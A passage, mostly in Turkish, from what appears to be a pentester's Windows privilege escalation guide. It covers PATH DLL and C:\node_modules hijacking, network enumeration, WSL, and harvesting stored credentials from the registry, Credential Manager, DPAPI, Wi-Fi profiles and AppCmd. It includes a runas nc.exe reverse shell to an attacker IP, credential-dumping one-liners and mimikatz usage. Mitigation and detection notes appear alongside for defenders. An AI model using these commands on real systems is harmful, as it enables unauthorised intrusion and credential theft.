DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Geliştiriciler için azaltma önlemleri
- DACL ile kısıtlanması amaçlanan cihaz nesnelerini oluştururken her zaman FILE_DEVICE_SECURE_OPEN ayarlayın.
- Ayrıcalıklı işlemler için çağıranın bağlamını doğrulayın. İşlem sonlandırmaya veya handle döndürmeye izin vermeden önce PP/PPL kontrolleri ekleyin.
- IOCTL’leri kısıtlayın (erişim maskeleri, METHOD_*, girdi doğrulaması) ve doğrudan kernel ayrıcalıkları yerine brokered modelleri değerlendirin.

Savunmacılar için tespit fikirleri
- Şüpheli cihaz adlarına (ör. \\ .\\amsdk*) yönelik user-mode açma girişimlerini ve kötüye kullanıma işaret eden belirli IOCTL dizilerini izleyin.
- Microsoft’un güvenlik açığı bulunan driver blocklist’ini (HVCI/WDAC/Smart App Control) zorunlu kılın ve kendi izin/verme listelerinizi yönetin.


## PATH DLL Hijacking

**PATH üzerindeki bir klasörde yazma izniniz** varsa, bir process tarafından yüklenen DLL’i hijack edebilir ve **yetki yükseltebilirsiniz**.<sup>[[2]](#references)</sup>

PATH içindeki tüm klasörlerin izinlerini kontrol edin:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Bu kontrolün nasıl kötüye kullanılabileceği hakkında daha fazla bilgi için:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## `C:\node_modules` üzerinden Node.js / Electron modül çözümlemesi ele geçirme

Bu, **Node.js** ve **Electron** uygulamalarının beklenen modül **bulunamadığında** `require("foo")` gibi yalın bir import gerçekleştirmesi durumunda etkilenen bir **Windows denetimsiz arama yolu** çeşididir.<sup>[[20]](#references)</sup>

Node, dizin ağacında yukarı doğru ilerleyerek her üst dizindeki `node_modules` klasörlerini kontrol eder. Windows’ta bu arama sürücü köküne kadar ulaşabilir; bu nedenle `C:\Users\Administrator\project\app.js` konumundan başlatılan bir uygulama şunları kontrol edebilir:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

**Düşük ayrıcalıklı bir kullanıcı** `C:\node_modules` oluşturabiliyorsa, buraya kötü amaçlı bir `foo.js` (veya paket klasörü) yerleştirip **daha yüksek ayrıcalıklı bir Node/Electron sürecinin** eksik bağımlılığı çözümlemesini bekleyebilir. Payload, kurban sürecinin güvenlik bağlamında çalıştırılır. Bu nedenle hedef yönetici olarak, yükseltilmiş bir zamanlanmış görev/hizmet sarmalayıcısından veya otomatik başlatılan ayrıcalıklı bir masaüstü uygulamasından çalıştığında bu durum **LPE**'ye dönüşür.

Bu durum özellikle aşağıdakilerde yaygındır:

- bir bağımlılık `optionalDependencies` içinde bildirilmişse<sup>[[22]](#references)</sup>
- üçüncü taraf bir kitaplık `require("foo")` çağrısını `try/catch` içine alıp hata durumunda çalışmaya devam ediyorsa
- bir paket üretim derlemelerinden kaldırılmışsa, paketleme sırasında dahil edilmemişse veya yüklenememişse
- savunmasız `require()` çağrısı ana uygulama kodu yerine bağımlılık ağacının derinliklerinde yer alıyorsa

### Savunmasız hedefleri arama

Çözümleme yolunu doğrulamak için **Procmon** kullanın:<sup>[[23]](#references)</sup>

- `Process Name` = hedef yürütülebilir dosya (`node.exe`, Electron uygulamasının EXE'si veya sarmalayıcı süreç) olacak şekilde filtreleyin
- `Path` için `contains` `node_modules` filtresi uygulayın
- `NAME NOT FOUND` sonuçlarına ve `C:\node_modules` altındaki son başarılı açma işlemine odaklanın

Paketinden çıkarılmış `.asar` dosyalarında veya uygulama kaynaklarında kullanılabilecek kod inceleme kalıpları:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Exploitation

1. Procmon veya kaynak incelemesiyle **eksik paket adını** belirleyin.
2. Henüz yoksa kök arama dizinini oluşturun:

```powershell
mkdir C:\node_modules
```

3. Beklenen adla tam olarak eşleşen bir modül bırakın:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Kurban uygulamayı tetikleyin. Uygulama `require("foo")` çağrısı yaparsa ve meşru modül mevcut değilse Node, `C:\node_modules\foo.js` dosyasını yükleyebilir.

Bu kalıba uyan, eksik isteğe bağlı modüllere gerçek dünya örnekleri `bluebird` ve `utf-8-validate`'dir; ancak yeniden kullanılabilir olan kısım **tekniktir**: ayrıcalıklı bir Windows Node/Electron sürecinin çözeceği herhangi bir **eksik çıplak import** bulun.

### Tespit ve güvenliği güçlendirme fikirleri

- Bir kullanıcı `C:\node_modules` oluşturduğunda veya buraya yeni `.js` dosyaları/paketleri yazdığında uyarı verin.
- `C:\node_modules\*` konumundan okuma yapan yüksek bütünlük düzeyindeki süreçleri araştırın.
- Üretimde tüm runtime bağımlılıklarını paketleyin ve `optionalDependencies` kullanımını denetleyin.
- Sessiz `try { require("...") } catch {}` kalıpları için üçüncü taraf kodlarını gözden geçirin.
- Kütüphane destekliyorsa isteğe bağlı kontrolleri devre dışı bırakın (örneğin, bazı `ws` kurulumlarında `WS_NO_UTF_8_VALIDATE=1` ile eski `utf-8-validate` kontrolünden kaçınılabilir).

## Ağ

### Paylaşımlar

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts dosyası

hosts dosyasında sabit kodlanmış diğer bilinen bilgisayarları kontrol edin.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Ağ Arayüzleri ve DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Açık Portlar

Dışarıdan **kısıtlı hizmetleri** kontrol edin.

```bash
netstat -ano #Opened ports?
```

Yerel bir dinleyici için PID'yi süreç sahibiyle, çalıştırılabilir dosyanın yolu ile ve onu başlatan hizmet veya zamanlanmış görevle ilişkilendirin. Bir uzaktan kontrol hizmeti, yalnızca kimlik doğrulaması ve komut denetimleri izin veriyorsa masaüstü kullanıcısı olarak erişim sağlayabilir. Daha yüksek ayrıcalıklı bir hesapla çalışan özel bir TCP uygulaması ayrı bir inceleme hedefidir: dinleyici ve ikili dosya yolu pasif ipuçlarıdır; kimlik doğrulaması gerektiren bir bellek bozulması yolunun değerlendirilmesi ise söz konusu ikili dosyanın ve erişilebilir girdisinin analiz edilmesini gerektirir. Açık bir bağlantı noktası bir sistem sürecine ait görünüyorsa, arka uç hizmetini ilişkilendirmeden önce [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) komutunun çıktısıyla karşılaştırın; tek başına bir yönlendirme kuralı, hedefe erişilebildiğini veya hedefin savunmasız olduğunu kanıtlamaz.

### Yönlendirme Tablosu

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP Tablosu

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Güvenlik Duvarı Kuralları

[**Güvenlik duvarıyla ilgili komutlar için bu sayfaya bakın**](../basic-cmd-for-pentesters.md#firewall) **(kuralları listeleme, kural oluşturma, kapatma, kapatma...)**

[Ağ keşfi için daha fazla komut burada](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

İkili dosya `bash.exe`, `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` konumunda da bulunabilir.

root kullanıcısını elde ederseniz herhangi bir portu dinleyebilirsiniz (`nc.exe` ile bir portu ilk kez dinlemeye çalıştığınızda, GUI üzerinden `nc`'ye firewall tarafından izin verilip verilmeyeceği sorulur).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Root olarak bash'i kolayca başlatmak için `--default-user root` seçeneğini deneyebilirsiniz.

`WSL` dosya sistemini `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` klasöründe inceleyebilirsiniz.

WSL içindeki Linux `root` kullanıcısı, tek başına Windows Administrator yetkileri sağlamaz. Mevcut Windows kimliği bir dağıtımın dosya sistemini okuyabiliyorsa, kimlik bilgilerini kaydetmiş olabilecek komutları bulmak için kabuk geçmişi dosyalarını ( `/root/.bash_history` dahil) inceleyin; ayrıcalık yükseltme için yine de geçerli bir yüksek ayrıcalıklı hesap ve izin verilen bir kimlik doğrulama yolu gerekir. `LocalState\rootfs` dizin yapısı eski WSL kurulumları için geçerlidir; WSL 2'de dağıtım genellikle bir [`ext4.vhdx` sanal diskinde](https://learn.microsoft.com/en-us/windows/wsl/disk-space) saklanır. Bu nedenle önce gerçek dağıtımı ve depolama yolunu belirleyin. Otomatik numaralandırma sırasında geçmiş dosyalarının içeriğini ekrana yazdırmaktan kaçının.

## Windows Kimlik Bilgileri

### Winlogon Kimlik Bilgileri

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Treat `DefaultUserName` ve `DefaultDomainName` değerlerini kimlik bilgisi değil, hesap bağlamı olarak değerlendirin. Boş olmayan bir `DefaultPassword` veya `AltDefaultPassword` değeri, registry'de bulunan düz metin bir bulgudur. `AutoAdminLogon=1` ise ancak okunabilir düz metin parola yoksa, bu yalnızca bir ipucudur: [Sysinternals Autologon parolayı LSA secret olarak saklayabilir](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon) ve sıradan registry okumaları, bu secret'ın var olup olmadığını veya elde edilip edilemeyeceğini ortaya koymaz. Bir kimlik bilgisi ifşası raporlamadan önce erişim haklarını ve gerçek oturum açma yapılandırmasını inceleyin.

### Credentials manager / Windows vault

Şuradan: [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault, **Windows**'un **kullanıcıları otomatik olarak oturum açtırmak** için kullanabileceği sunucular, web siteleri ve diğer programlara ait kullanıcı kimlik bilgilerini saklar. İlk bakışta bu, kullanıcıların Facebook, Twitter veya Gmail gibi sitelere ait kimlik bilgilerini saklayıp tarayıcıların otomatik olarak oturum açmasını sağlayabileceği anlamına geliyor gibi görünebilir, ancak çalışma şekli bu değildir.

Windows Vault, Windows'un kullanıcıları otomatik olarak oturum açtırabileceği kimlik bilgilerini saklar; bu da bir kaynağa (sunucu veya web sitesi) erişmek için kimlik bilgilerine ihtiyaç duyan herhangi bir **Windows uygulamasının** bu Credential Manager ve Windows Vault'u kullanabileceği ve kullanıcılara sürekli kullanıcı adı ve parola girmek yerine sağlanan kimlik bilgilerini kullanabileceği anlamına gelir.

Uygulamalar Credential Manager ile etkileşime girmediği sürece, belirli bir kaynağa ait kimlik bilgilerini kullanabileceklerini sanmıyorum. Dolayısıyla uygulamanız kasadan yararlanmak istiyorsa, varsayılan depolama kasasından o kaynağa ait kimlik bilgilerini **istemek için credential manager ile bir şekilde iletişim kurmalıdır**.

Makinede saklanan kimlik bilgilerini listelemek için `cmdkey` kullanın.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Ardından kayıtlı kimlik bilgilerini kullanmak için `runas` komutunu `/savecred` seçeneğiyle kullanabilirsiniz. Aşağıdaki örnek, bir SMB paylaşımı üzerinden uzak bir binary'yi çalıştırıyor.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Sağlanan kimlik bilgileriyle `runas` kullanma.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) veya [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) kullanabileceğinizi unutmayın.

### UWP PasswordVault / Credential Locker

Modern Windows UWP uygulamaları, Microsoft Edge ve modern sistem hizmetleri; kimlik doğrulama token’larını ve plaintext parolaları Universal Windows Platform (UWP) `PasswordVault` içinde saklar (`vaultcmd` aracında `Web Credentials` olarak da görünür). Bu depolama alanı oturumdan yalıtılmıştır ve yönetici veya `SeDebugPrivilege` hakları olmadan, yerel olarak şifresi çözülebilir.

Saklanan tüm kullanıcı adlarını ve plaintext parolaları anında dökmek ve şifrelerini çözmek için bu PowerShell komutunu kullanıcının etkin oturumunda çalıştırın:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API (DPAPI)**, verilerin simetrik şifrelenmesi için bir yöntem sunar ve Windows işletim sisteminde çoğunlukla asimetrik özel anahtarların simetrik şifrelenmesi için kullanılır. Bu şifreleme, entropiye önemli ölçüde katkıda bulunmak için bir kullanıcı veya sistem sırrından yararlanır.

**DPAPI, kullanıcının oturum açma sırlarından türetilen bir simetrik anahtar aracılığıyla anahtarların şifrelenmesini sağlar**. Sistem şifrelemesi senaryolarında sistemin etki alanı kimlik doğrulama sırlarını kullanır.

DPAPI kullanılarak şifrelenen kullanıcı RSA anahtarları, `{SID}` kullanıcının [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) değerini temsil etmek üzere `%APPDATA%\Microsoft\Protect\{SID}` dizininde saklanır. **Aynı dosyada kullanıcının özel anahtarlarını koruyan ana anahtarla birlikte bulunan DPAPI anahtarı**, genellikle 64 baytlık rastgele veriden oluşur. (Bu dizine erişimin kısıtlı olduğunu ve içeriğinin CMD'deki `dir` komutuyla listelenemediğini, ancak PowerShell aracılığıyla listelenebildiğini unutmayın.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

`dpapi::masterkey` **mimikatz module**'ünü uygun argümanlarla (`/pvk` veya `/rpc`) kullanarak şifreyi çözebilirsiniz.

**Ana parola tarafından korunan kimlik bilgisi dosyaları** genellikle şu konumda bulunur:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

You can use **mimikatz module** `dpapi::cred` with the appropriate `/masterkey` to decrypt.\
You can **extract many DPAPI** **masterkeys** from **memory** with the `sekurlsa::dpapi` module (if you are root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** are often used for **scripting** and otomasyon görevlerinde, şifrelenmiş kimlik bilgilerini kolayca saklamanın bir yolu olarak. Kimlik bilgileri **DPAPI** kullanılarak korunur; bu da genellikle yalnızca oluşturuldukları bilgisayardaki aynı kullanıcı tarafından çözülebilecekleri anlamına gelir.

Dışa aktarılan bir kimlik bilgisi, rastgele bir dosya adına veya `.xml` yoluna sahip olabilir. Bir betik ya da dosya envanteri böyle bir dosyaya işaret ediyorsa, `C:\Users` konumunu varsaymak yerine hesabın gerçek profil dizinini bulun: [Windows profilleri başka konumlara yerleştirebilir](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Dosyanın okunabilir olması yalnızca bir ipucudur; [Windows `Export-Clixml`, şifrelenmiş bir kimlik bilgisini dışa aktaran kullanıcıya ve bilgisayara bağlar](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml) ve kurtarılan hesabın hedef hizmette ayrıca geçerli yetkilere sahip olması gerekir. Rutin envanter çıkarma sırasında şifrelenmiş veya açık metin değerlerini yazdırmadan önce yolları ve ACL'leri inceleyin.

Bir dosyadaki PS credentials bilgisini **decrypt** etmek için şunu yapabilirsiniz:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Kaydedilmiş RDP Bağlantıları

Bunları `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
ve `HKCU\Software\Microsoft\Terminal Server Client\Servers\` konumlarında bulabilirsiniz.

### Son Çalıştırılan Komutlar

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Uzak Masaüstü Kimlik Bilgisi Yöneticisi**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

**Mimikatz** `dpapi::rdg` modülünü uygun `/masterkey` ile kullanarak **herhangi bir .rdg dosyasının şifresini çözün**\
Mimikatz `sekurlsa::dpapi` modülüyle bellekten **birçok DPAPI masterkey çıkarabilirsiniz**

**mRemoteNG farklı bir bağlantı deposu kullanır.** `%APPDATA%\mRemoteNG` ve kullanıcının Belgeler klasörü altındaki okunabilir XML dosyalarını, `config.xml` gibi sıradan adlara sahip dosyalar da dahil olmak üzere inceleyin. Bir XML dosyasını kimlik bilgisi adayı olarak değerlendirmeden önce bağlantı şemasını ve şifrelenmiş `Password` özniteliklerini belirleyin. Saklanan değer bir DPAPI/RDCMan parolası değildir; kurtarma, dosyanın şifreleme ayarlarına ve özel bir master password kullanılıp kullanılmadığına bağlıdır. Kapsamlı tarama sırasında şifrelenmiş değerleri yazdırmaktan kaçının.

**Remote Desktop Plus profil dışa aktarımları** da kullanıcı dizinlerinde veya paylaşılan bir yönetim klasöründe okunabilir durumda bulunabilir. Eski bir `profiles.xml` dışa aktarımında `ProfileName`, `Password` ve `Secure` öğelerini içeren `Data/Profile` girdileri bulunur. Boş olmayan bir parola öğesini, yazdırmadan veya düz metin olduğunu varsaymadan, bir kimlik bilgisi adayı olarak değerlendirin: [üretici notlarına göre](https://www.donkz.nl/), profil koruması profili oluşturan hesaba ve bilgisayara bağlanabilir ya da daha gevşek biçimde yapılandırılabilir. Bu dosyaya güvenmeden önce kaynağını ve kurtarma koşullarını doğrulayın.

### Sticky Notes

İnsanlar bazen parola ve diğer bilgileri yapışkan not uygulamalarına kaydeder. Microsoft'un paketlenmiş Sticky Notes uygulaması notları genellikle `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` konumunda saklar; eski veya farklı uygulamalar, LevelDB dahil başka kullanıcı profili depolarını kullanabilir. Eksik bir SQLite dosyasını not bulunmadığının kanıtı saymadan önce yüklü uygulamayı ve depolama biçimini belirleyin.

Sticky Notes SQLite write-ahead logging kullanıyorsa, yalnızca `plum.sqlite` dosyasının kopyası son kaydedilmiş notları içermeyebilir. Veritabanının tutarlı bir kopyasıyla eşleşen `plum.sqlite-wal` dosyasını da saklayın ve varsa `plum.sqlite-shm` dosyasını da ekleyin; paylaşılan bellek dizini yeniden oluşturulabilir, ancak WAL veritabanının kalıcı durumunun bir parçasıdır. [SQLite'ın WAL belgelerine](https://www.sqlite.org/wal.html) bakın. Hesap adı veya parola içeren bir not yalnızca bir kimlik bilgisi adayıdır: hesabı, izin verilen erişimi ve parola tekrar kullanımını ayrı ayrı doğrulayın. Şifrelenmiş bir parola yöneticisi kaydının daha yüksek ayrıcalıklı bir oturumu kanıtlayabilmesi için ayrıca gerçek şifre çözme anahtarı ve uygulamaya özgü yorumlama gerekir.

### AppCmd.exe

**AppCmd.exe'den parolaları kurtarmak için Administrator olmanız ve işlemi High Integrity düzeyinde çalıştırmanız gerektiğini unutmayın.**\
**AppCmd.exe**, `%systemroot%\system32\inetsrv\` dizininde bulunur.\
Bu dosya varsa, bazı **kimlik bilgileri** yapılandırılmış ve **kurtarılabilir** olabilir.

Bu kod [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) projesinden alınmıştır:

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` dosyasının mevcut olup olmadığını kontrol edin .\
Yükleyiciler **SYSTEM ayrıcalıklarıyla çalıştırılır; çoğu, [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)** adresindeki bilgiye göre **DLL Sideloading** saldırılarına karşı savunmasızdır.**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Dosyalar ve Registry (Kimlik Bilgileri)

### Support-tool registry kimlik bilgisi izleri

Bazı eski remote-support kurulumları, sabit uygulama registry anahtarları altında parola ile ilgili değer adlarını saklar. Örneğin, [üreticinin registry anahtarı açıklamasına](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988) göre TeamViewer'ın `SecurityPasswordAES` değeri, 9'dan önceki sürümlerde yapılandırılmış statik bir oturum parolasını tanımlıyordu. Bir değer adı işareti yalnızca inceleme için bir ipucudur: Bu kimlik bilgisini değerlendirirken kurulu sürümü, okunabilir değer verisini, biçimi ve mevcut kimlik doğrulama davranışını doğrulayın. Remote-support parolasından daha ayrıcalıklı bir Windows hesabına geçiş için ayrıca parolanın gerçekten yeniden kullanıldığının ve söz konusu hesap için yetkiniz olduğunun doğrulanması gerekir. Şifreli metni ve kurtarılan parolaları rutin enumerasyon çıktısına eklemeyin.

### Korunan sayfalar içeren paylaşılan spreadsheets

Okunabilir bir paylaşılan workbook'un hesap verileri içerdiğinden şüpheleniyorsanız **dosya şifrelemesini**, worksheet korumasından veya gizli sütunlardan ayırın. [Microsoft'un belirttiğine göre](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel), worksheet koruması düzenlemeyi denetler ve bir güvenlik özelliği değildir; tek başına workbook içeriğinin şifrelendiğini göstermez. Yalnızca yetkili olduğunuz, ilgili dosyaları inceleyin ve geniş kapsamlı enumerasyon sırasında olası sırları yazdırmaktan kaçının. Okunabilir bir `.xlsx` yolu, korumalı bir sayfa veya gizli bir sütun tek başına kimlik bilgilerinin bulunduğunu ya da herhangi bir hesabın daha yüksek ayrıcalıklara sahip olduğunu kanıtlamaz; gerçek verileri ve mevcut hesap haklarını ayrı ayrı doğrulayın.

### CI server tarafından tutulan değişiklik yamaları

Bir CI server, build tamamlandıktan sonra bile gönderilen kaynak değişikliklerini veri dizininde tutabilir. [TeamCity belgelerinde](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes`, uzaktan çalıştırma değişikliklerinin depolandığı yer olarak tanımlanır; veri dizini yapılandırılabilir ve mutlaka `ProgramData` altında bulunmaz. Okunabilir bir yama, kimlik bilgisi dosyasına, şifreleme anahtarına veya ikisini kullanan bir script'e yapılan kaldırılmış ya da eklenmiş referansları koruyabilir. Örneğin, PowerShell'deki `ConvertTo-SecureString -Key` iş akışı, AES anahtarının yanı sıra şifrelenmiş metni de gerektirir; [Microsoft'un belgelerinde](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) anahtarın ayrıca sağlandığı belirtilir. Önce yalnızca erişilebilir yama adlarını inceleyin, ardından sırları rutin enumerasyon çıktısına yazdırmadan ve yetkiniz dahilinde ilgili içeriği inceleyin. Bir yama yolu, şifrelenmiş değer veya anahtar referansı tek başına geçerli bir kimlik bilgisini ya da daha ayrıcalıklı erişimi kanıtlamaz. Veri dizini ACL'lerini kısıtlayın ve build değişikliklerine sır eklemekten kaçının.

### Özel yerel administrator parola rotasyonu

Kurum içinde geliştirilmiş bir parola rotator, şifrelenmiş bir yerel administrator parolasını yerel bir service içinde saklarken datastore kimlik bilgilerini okunabilir bir `.env` dosyasında veya updater binary'sinin yanında tutabilir. Updater'ın scheduled task'ını, hesabını, yapılandırma ACL'lerini, listener'ını ve datastore izinlerini birlikte inceleyin. Yalnızca loopback'e bağlı bir datastore'a, geçerli kimlik bilgilerine sahip yerel bir kullanıcı yine de erişebilir; ancak kimlik doğrulamanın başarılı olması, ilgili kayıtları okuma izninin bulunduğunu kanıtlamaz. Şifreleme seed'i veya anahtar materyali şifreli metnin yanında erişilebiliyorsa, şifrelemeye güvenmeden önce kullanılan tam anahtar türetme yöntemini inceleyin. Açığa çıkmış bir seed'den Go [`math/rand`](https://pkg.go.dev/math/rand) kullanarak deterministik biçimde AES anahtarı türeten bir yöntem, bu parolayı korumak için uygun değildir; Go belgeleri bu paketin güvenlik açısından hassas rastgelelik işlemleri için uygun olmadığını belirtir. Kurtarılan herhangi bir parolayı bir yükseltme yolu olarak değerlendirmeden önce güncel olduğunu ve yerel Administrators grubu üyesi bir hesaba ait olduğunu doğrulayın. Bir scheduled task, `.env` yolu veya şifreli bir blob bu koşulların hiçbirini tek başına kanıtlamaz. Parolaları ve anahtar materyalini rutin enumerasyon çıktısına eklemeyin.

Yönetilen yerel administrator parolaları için [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) kullanın. LAPS'in directory veya Entra destekli depolaması ve erişim denetimleri, özel bir yerel datastore'dan farklıdır; benzer şekilde [Elasticsearch rollerinde](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) kimliği doğrulanmış bir datastore kullanıcısının belirli bir index'i okuyup okuyamayacağı belirlenir.

